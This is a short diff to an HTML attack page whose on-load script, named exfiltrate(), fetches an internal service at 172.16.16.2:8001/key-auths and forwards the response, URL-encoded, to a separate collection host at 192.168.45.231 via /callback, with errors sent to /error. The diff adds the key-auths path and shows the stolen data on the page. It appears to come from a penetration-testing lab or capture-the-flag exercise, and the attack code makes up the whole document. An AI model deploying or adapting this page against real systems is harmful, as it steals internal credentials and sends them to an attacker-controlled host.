@@ -2,17 +2,21 @@
 <head>
 <script>
 function exfiltrate() {
-	fetch("http://172.16.16.2:8001")
+	const dataElement = document.getElementById('data');
+
+	fetch("http://172.16.16.2:8001/key-auths")
 	.then((response) => response.text())
 	.then((data) => {
 		fetch("http://192.168.45.231/callback?" + encodeURIComponent(data));
+		dataElement.innerHTML = data;
 	}).catch(err => {
 		fetch("http://192.168.45.231/error?" + encodeURIComponent(err));
+		dataElement.innerHTML = 'error fetching the webpage';
 	});
 }
 </script>
 </head>
 <body onload='exfiltrate()'>
-<div></div>
+<div id="data"></div>
 </body>
 </html>
